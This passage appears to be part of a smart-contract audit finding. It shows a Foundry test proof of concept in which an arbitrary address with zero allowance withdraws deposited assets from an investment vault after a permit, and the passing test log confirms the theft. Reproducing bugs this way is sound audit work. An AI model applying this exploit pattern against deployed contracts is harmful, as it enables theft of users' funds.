", domainSeparator, structHash));\n\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(validatorPk, digest);\n\n        // 3. Execute Permit\n        wInvestmentShare.permit(address(mainShareToken), address(mainShareToken), type(uint256).max, deadline, v, r, s);\n\n        //!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n        // Anyone can withdraw assets frmo WRC7575Vault\n        address rando = vm.addr(0x52414e4430);\n        console.log(\"Allowance: \", wInvestmentShare.allowance(address(mainShareToken), rando));\n        assertEq(0, wInvestmentShare.allowance(address(mainShareToken), address(rando)));\n        vm.startPrank(rando);\n        wInvestmentVault.withdraw(depositAmount,rando, address(mainShareToken));\n        vm.stopPrank();\n        console.log(\"Balance : \", asset.balanceOf(address(rando)));\n        assertNotEq(0, asset.balanceOf(address(rando)));\n        //!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n    }\n}\n```\n\n##Output\n```log\nRan 1 test for test/AuditReproduction.t.sol:AuditReproductionTest\n[PASS] testAnyoneCanStealFromInvestmentVault() (gas: 4373561)\nLogs:\n  Allowance:  0\n  Balance :  1000000000000000000000\n\nSuite result: ok. 1 passed; 0 failed; 0 skipped; finished in 4.93ms (2.07ms CPU time)\n```",
